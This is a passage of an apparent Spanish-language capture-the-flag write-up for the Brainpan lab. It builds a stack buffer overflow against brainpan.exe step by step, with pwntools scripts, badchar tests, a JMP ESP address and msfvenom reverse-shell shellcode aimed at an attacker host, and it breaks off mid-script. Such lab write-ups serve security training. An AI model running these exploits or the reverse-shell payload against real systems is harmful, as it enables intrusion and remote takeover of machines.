pattern </span><span class="o">= </span><span class="no">b</span><span class="s">"Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9"  </span><span class="p">

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)

shell.sendline(pattern)
shell.close()</span>
</code></pre></div></div><br>

<p class="plain-text">Corriendo ya el programa con ejecutamos el script para enviar la cadena de caracteres</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 9999: Done  
[</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.5 port 9999</span>
</code></pre></div></div><br>

<p class="plain-text">Volvemos al <code class="language-plaintext highlighter-rouge">Immunity Debugger</code> y podemos ver que el programa se corrompe, el valor de <code class="language-plaintext highlighter-rouge">EIP</code> nos ayudara a saber los <code class="language-plaintext highlighter-rouge">bytes</code> necesarios antes de llegar a el</p>
<a href="/thm/brainpan/6.png" target="_blank"><div><p><img src="/thm/brainpan/6.png"></p></div></a>

<p class="plain-text">Al pasarle el valor de <code class="language-plaintext highlighter-rouge">EIP</code> a <code class="language-plaintext highlighter-rouge">msf-pattern_offset</code> nos devuelve el <code class="language-plaintext highlighter-rouge">offset</code>, <code class="language-plaintext highlighter-rouge">524</code> caracteres son necesarios antes de sobreescribir el registro <code class="language-plaintext highlighter-rouge">EIP</code> en el programa</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msf-pattern_offset</span><span class="p"> -q 35724134  
[*] Exact match at offset 524</span>
</code></pre></div></div><br>

<p class="plain-text">Nuestro script para comprobar enviara <code class="language-plaintext highlighter-rouge">524</code> bytes de <code class="language-plaintext highlighter-rouge">junk</code> y <code class="language-plaintext highlighter-rouge">4 B</code> que simulan el EIP</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

offset </span><span class="o">= </span><span class="mi">524</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
eip </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">eip

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)  

shell.sendline(payload)
shell.close()</span>
</code></pre></div></div><br>

<p class="plain-text">Corremos de nuevo el <code class="language-plaintext highlighter-rouge">exe</code> y al ejecutar el script podemos ver reflejadas las <code class="language-plaintext highlighter-rouge">4 B</code> en el registro <code class="language-plaintext highlighter-rouge">EIP</code> significa que nuestro offset de <code class="language-plaintext highlighter-rouge">524</code> bytes es correcto</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 9999: Done  
[</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.5 port 9999</span>
</code></pre></div></div><br>
<a href="/thm/brainpan/7.png" target="_blank"><div><p><img src="/thm/brainpan/7.png"></p></div></a>

<p class="plain-text">Lo siguiente sera detectar <code class="language-plaintext highlighter-rouge">badchars</code> por lo que con <code class="language-plaintext highlighter-rouge">mona</code> crearemos una lista con todos los caracteres posibles, esto nos creara un archivo <code class="language-plaintext highlighter-rouge">txt</code> y un <code class="language-plaintext highlighter-rouge">bin</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">!mona bytearray  </span>
</code></pre></div></div><br>
<a href="/thm/brainpan/8.png" target="_blank"><div><p><img src="/thm/brainpan/8.png"></p></div></a>

<p class="plain-text">Modificaremos el script para que despues del <code class="language-plaintext highlighter-rouge">EIP</code> envie nuestros posibles badchars</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

offset </span><span class="o">=</span><span class="mi"> 524</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
eip </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">

badchars </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"  </span><span class="p">

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">eip </span><span class="o">+ </span><span class="p">badchars

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)

shell.sendline(payload)
shell.close()</span>
</code></pre></div></div><br>

<p class="plain-text">Enviamos los caracteres y lo que nos interesa para comparar es la dirección del <code class="language-plaintext highlighter-rouge">ESP</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 9999: Done  
[</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.5 port 9999</span>
</code></pre></div></div><br>
<a href="/thm/brainpan/9.png" target="_blank"><div><p><img src="/thm/brainpan/9.png"></p></div></a>

<p class="plain-text">Lo siguiente es con <code class="language-plaintext highlighter-rouge">mona</code> comparar el <code class="language-plaintext highlighter-rouge">.bin</code> que nos creo con la dirección del <code class="language-plaintext highlighter-rouge">ESP</code> actual, como resultado nos muestra que se corrompe despues de <code class="language-plaintext highlighter-rouge">1</code> byte quiere decir que el <code class="language-plaintext highlighter-rouge">00</code> esta corrompiendo el resto de caracteres que estan delante de el</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">!mona compare -f bytearray.bin -a 005FF910  </span>
</code></pre></div></div><br>
<a href="/thm/brainpan/10.png" target="_blank"><div><p><img src="/thm/brainpan/10.png"></p></div></a>

<p class="plain-text">Creamos un nuevo <code class="language-plaintext highlighter-rouge">bytearray</code> esta vez quitando el <code class="language-plaintext highlighter-rouge">\x00</code> que vimos es un badchar</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">!mona bytearray -cpb "\x00"  </span>
</code></pre></div></div><br>
<a href="/thm/brainpan/11.png" target="_blank"><div><p><img src="/thm/brainpan/11.png"></p></div></a>

<p class="plain-text">Modificamos el script ahora con el nuevo <code class="language-plaintext highlighter-rouge">bytearray</code> que no incluye el caracter <code class="language-plaintext highlighter-rouge">\x00</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

offset </span><span class="o">=</span><span class="mi"> 524</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset
eip </span><span class="o">= </span><span class="no">b</span><span class="s">"B" </span><span class="o">* </span><span class="mi">4</span><span class="p">

badchars </span><span class="o">= </span><span class="no">b</span><span class="s">""</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0</span><span class="s">"</span><span class="p">
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0</span><span class="s">"</span><span class="p">  
badchars </span><span class="o">+= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff</span><span class="s">"  </span><span class="p">

payload </span><span class="o">= </span><span class="p">junk </span><span class="o">+ </span><span class="p">eip </span><span class="o">+ </span><span class="p">badchars

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)

shell.sendline(payload)
shell.close()</span>
</code></pre></div></div><br>

<p class="plain-text">Enviamos y al volver a hacer el <code class="language-plaintext highlighter-rouge">mona compare</code> podemos ver <code class="language-plaintext highlighter-rouge">unmodified</code> quiere decir que todos los caracteres enviados se procesaron correctamente en el programa</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ python3 </span><span class="p">exploit.py
[</span><span class="ve">+</span><span class="p">] Opening connection to 192.168.100.5 on port 9999: Done  
[</span><span class="az">*</span><span class="p">] Closed connection to 192.168.100.5 port 9999</span>
</code></pre></div></div><br>
<a href="/thm/brainpan/12.png" target="_blank"><div><p><img src="/thm/brainpan/12.png"></p></div></a>

<p class="plain-text">Listando los modulos con <code class="language-plaintext highlighter-rouge">mona</code> encontramos que solo esta <code class="language-plaintext highlighter-rouge">brainpan.exe</code> sin nunguna proteccion, asi que podemos inyectar <code class="language-plaintext highlighter-rouge">shellcode</code> malicioso en la pila</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">!mona modules  </span>
</code></pre></div></div><br>

<a href="/thm/brainpan/13.png" target="_blank"><div><p><img src="/thm/brainpan/13.png"></p></div></a>

<p class="plain-text">Sin embargo para llegar al la pila donde enviaremos el shellcode para que se interprete necesitamos una dirección que ejecute la instrucción <code class="language-plaintext highlighter-rouge">JMP ESP</code>, su equivalente es <code class="language-plaintext highlighter-rouge">FFE4</code>, se representa como <code class="language-plaintext highlighter-rouge">\xff\xe4</code>, lo vemos con <code class="language-plaintext highlighter-rouge">msf-nasm_shell</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msf-nasm_shell</span><span class="p">
nasm > JMP ESP
00000000  FFE4              jmp esp  
nasm ></span>
</code></pre></div></div><br>

<p class="plain-text">Ahora con <code class="language-plaintext highlighter-rouge">mona find</code> buscamos una dirección que ejecuta esa instrucción, solo encontramos un <code class="language-plaintext highlighter-rouge">ponter</code> que lo hace y es la dirección <code class="language-plaintext highlighter-rouge">0x311712f3</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">!mona find -s "\xff\xe4" -m brainpan.exe  </span>
</code></pre></div></div><br>
<a href="/thm/brainpan/14.png" target="_blank"><div><p><img src="/thm/brainpan/14.png"></p></div></a>

<p class="plain-text">Sin embargo al estar en <code class="language-plaintext highlighter-rouge">little endian</code> tenemos que darle la vuelta a la direccion</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">\x31\x17\x12\xf3     </span><span class="o">--></span><span class="p">     \xf3\x12\x17\x31  </span>
</code></pre></div></div><br>

<p class="plain-text">Iniciamos un script definiendo el <code class="language-plaintext highlighter-rouge">junk</code> y la direccion que ejecuta el <code class="language-plaintext highlighter-rouge">JMP ESP</code></P>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

offset </span><span class="o">= </span><span class="mi">524</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A" </span><span class="o">* </span><span class="p">offset

jmpesp </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xf3\x12\x17\x31</span><span class="s">"  </span>
</code></pre></div></div><br>

<p class="plain-text">Con <code class="language-plaintext highlighter-rouge">msfvenom</code> crearemos un <code class="language-plaintext highlighter-rouge">shellcode</code> que nos envie una <code class="language-plaintext highlighter-rouge">shell</code> a nuestro equipo</p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="p">-p windows/shell_reverse_tcp    </span><span class="c1"># Indica la plataforma y el payload  </span><span class="p">
-a x86                          </span><span class="c1"># Indica la arquitectura</span><span class="p">
LHOST=192.168.100.85            </span><span class="c1"># Indica el host del atacante</span><span class="p">
LPORT=443                       </span><span class="c1"># Indica el puerto del atacante</span><span class="p">
EXITFUNC=thread                 </span><span class="c1"># Indica que se ejecutara en un hilo  </span><span class="p">
-b '\x00'                       </span><span class="c1"># Indica todos los badchars</span><span class="p">
-f python                       </span><span class="c1"># Indica el formato del shellcode</span><span class="p">
-v shellcode                    </span><span class="c1"># Indica el nombre de la variable  </span>
</code></pre></div></div><br>

<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="ve">❯ msfvenom</span><span class="p"> -p windows/shell_reverse_tcp -a x86 LHOST=192.168.100.85 LPORT=443 EXITFUNC=thread -b </span><span class="am">'\x00'</span><span class="p"> -f python -v shellcode  
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
Found 11 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 351 (iteration=0)
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes
Final size of python file: 1965 bytes
shellcode =  b""
shellcode += b"\xda\xc2\xd9\x74\x24\xf4\x58\xbd\x91\x4d\xed"
shellcode += b"\x34\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x13"
shellcode += b"\x03\xf9\x5e\x0f\xc1\x05\x88\x4d\x2a\xf5\x49"
shellcode += b"\x32\xa2\x10\x78\x72\xd0\x51\x2b\x42\x92\x37"
shellcode += b"\xc0\x29\xf6\xa3\x53\x5f\xdf\xc4\xd4\xea\x39"
shellcode += b"\xeb\xe5\x47\x79\x6a\x66\x9a\xae\x4c\x57\x55"
shellcode += b"\xa3\x8d\x90\x88\x4e\xdf\x49\xc6\xfd\xcf\xfe"
shellcode += b"\x92\x3d\x64\x4c\x32\x46\x99\x05\x35\x67\x0c"
shellcode += b"\x1d\x6c\xa7\xaf\xf2\x04\xee\xb7\x17\x20\xb8"
shellcode += b"\x4c\xe3\xde\x3b\x84\x3d\x1e\x97\xe9\xf1\xed"
shellcode += b"\xe9\x2e\x35\x0e\x9c\x46\x45\xb3\xa7\x9d\x37"
shellcode += b"\x6f\x2d\x05\x9f\xe4\x95\xe1\x21\x28\x43\x62"
shellcode += b"\x2d\x85\x07\x2c\x32\x18\xcb\x47\x4e\x91\xea"
shellcode += b"\x87\xc6\xe1\xc8\x03\x82\xb2\x71\x12\x6e\x14"
shellcode += b"\x8d\x44\xd1\xc9\x2b\x0f\xfc\x1e\x46\x52\x69"
shellcode += b"\xd2\x6b\x6c\x69\x7c\xfb\x1f\x5b\x23\x57\xb7"
shellcode += b"\xd7\xac\x71\x40\x17\x87\xc6\xde\xe6\x28\x37"
shellcode += b"\xf7\x2c\x7c\x67\x6f\x84\xfd\xec\x6f\x29\x28"
shellcode += b"\xa2\x3f\x85\x83\x03\xef\x65\x74\xec\xe5\x69"
shellcode += b"\xab\x0c\x06\xa0\xc4\xa7\xfd\x23\x2b\x9f\x99"
shellcode += b"\xe6\xc3\xe2\x61\x08\xaf\x6a\x87\x60\xdf\x3a"
shellcode += b"\x10\x1d\x46\x67\xea\xbc\x87\xbd\x97\xff\x0c"
shellcode += b"\x32\x68\xb1\xe4\x3f\x7a\x26\x05\x0a\x20\xe1"
shellcode += b"\x1a\xa0\x4c\x6d\x88\x2f\x8c\xf8\xb1\xe7\xdb"
shellcode += b"\xad\x04\xfe\x89\x43\x3e\xa8\xaf\x99\xa6\x93"
shellcode += b"\x6b\x46\x1b\x1d\x72\x0b\x27\x39\x64\xd5\xa8"
shellcode += b"\x05\xd0\x89\xfe\xd3\x8e\x6f\xa9\x95\x78\x26"
shellcode += b"\x06\x7c\xec\xbf\x64\xbf\x6a\xc0\xa0\x49\x92"
shellcode += b"\x71\x1d\x0c\xad\xbe\xc9\x98\xd6\xa2\x69\x66"
shellcode += b"\x0d\x67\x99\x2d\x0f\xce\x32\xe8\xda\x52\x5f"
shellcode += b"\x0b\x31\x90\x66\x88\xb3\x69\x9d\x90\xb6\x6c"
shellcode += b"\xd9\x16\x2b\x1d\x72\xf3\x4b\xb2\x73\xd6"</span>
</code></pre></div></div><br>

<p class="plain-text">Agregamos esto al script además de la conexión para enviar todo nuestro <code class="language-plaintext highlighter-rouge">payload</code></p>
<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
<code><span class="c1">#!/usr/bin/python3
</span><span class="o">from </span><span class="p">pwn </span><span class="o">import </span><span class="p">remote

offset </span><span class="o">= </span><span class="mi">524</span><span class="p">
junk </span><span class="o">= </span><span class="no">b</span><span class="s">"A"</span><span class="o"> * </span><span class="p">offset

jmpesp </span><span class="o">= </span><span class="no">b</span><span class="s">"</span><span class="mi">\xf3\x12\x17\x31</span><span class="s">"</span><span class="p">

shellcode </span><span class="o">= </span><span class="no"> b</span><span class="s">"</span><span class="mi"></span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xda\xc2\xd9\x74\x24\xf4\x58\xbd\x91\x4d\xed</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x34\x33\xc9\xb1\x52\x83\xe8\xfc\x31\x68\x13</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x03\xf9\x5e\x0f\xc1\x05\x88\x4d\x2a\xf5\x49</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x32\xa2\x10\x78\x72\xd0\x51\x2b\x42\x92\x37</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xc0\x29\xf6\xa3\x53\x5f\xdf\xc4\xd4\xea\x39</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xeb\xe5\x47\x79\x6a\x66\x9a\xae\x4c\x57\x55</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa3\x8d\x90\x88\x4e\xdf\x49\xc6\xfd\xcf\xfe</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x92\x3d\x64\x4c\x32\x46\x99\x05\x35\x67\x0c</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1d\x6c\xa7\xaf\xf2\x04\xee\xb7\x17\x20\xb8</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x4c\xe3\xde\x3b\x84\x3d\x1e\x97\xe9\xf1\xed</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe9\x2e\x35\x0e\x9c\x46\x45\xb3\xa7\x9d\x37</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6f\x2d\x05\x9f\xe4\x95\xe1\x21\x28\x43\x62</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x2d\x85\x07\x2c\x32\x18\xcb\x47\x4e\x91\xea</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x87\xc6\xe1\xc8\x03\x82\xb2\x71\x12\x6e\x14</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x8d\x44\xd1\xc9\x2b\x0f\xfc\x1e\x46\x52\x69</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd2\x6b\x6c\x69\x7c\xfb\x1f\x5b\x23\x57\xb7</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd7\xac\x71\x40\x17\x87\xc6\xde\xe6\x28\x37</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xf7\x2c\x7c\x67\x6f\x84\xfd\xec\x6f\x29\x28</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xa2\x3f\x85\x83\x03\xef\x65\x74\xec\xe5\x69</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xab\x0c\x06\xa0\xc4\xa7\xfd\x23\x2b\x9f\x99</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xe6\xc3\xe2\x61\x08\xaf\x6a\x87\x60\xdf\x3a</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x10\x1d\x46\x67\xea\xbc\x87\xbd\x97\xff\x0c</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x32\x68\xb1\xe4\x3f\x7a\x26\x05\x0a\x20\xe1</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x1a\xa0\x4c\x6d\x88\x2f\x8c\xf8\xb1\xe7\xdb</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xad\x04\xfe\x89\x43\x3e\xa8\xaf\x99\xa6\x93</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x6b\x46\x1b\x1d\x72\x0b\x27\x39\x64\xd5\xa8</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x05\xd0\x89\xfe\xd3\x8e\x6f\xa9\x95\x78\x26</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x06\x7c\xec\xbf\x64\xbf\x6a\xc0\xa0\x49\x92</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x71\x1d\x0c\xad\xbe\xc9\x98\xd6\xa2\x69\x66</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x0d\x67\x99\x2d\x0f\xce\x32\xe8\xda\x52\x5f</span><span class="s">"</span><span class="p">
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\x0b\x31\x90\x66\x88\xb3\x69\x9d\x90\xb6\x6c</span><span class="s">"</span><span class="p">  
shellcode </span><span class="o">+=</span><span class="no"> b</span><span class="s">"</span><span class="mi">\xd9\x16\x2b\x1d\x72\xf3\x4b\xb2\x73\xd6</span><span class="s">"</span><span class="p">

shell </span><span class="o">= </span><span class="p">remote(</span><span class="s">"192.168.100.5"</span><span class="p">, </span><span class="mi">9999</span><span class="p">)

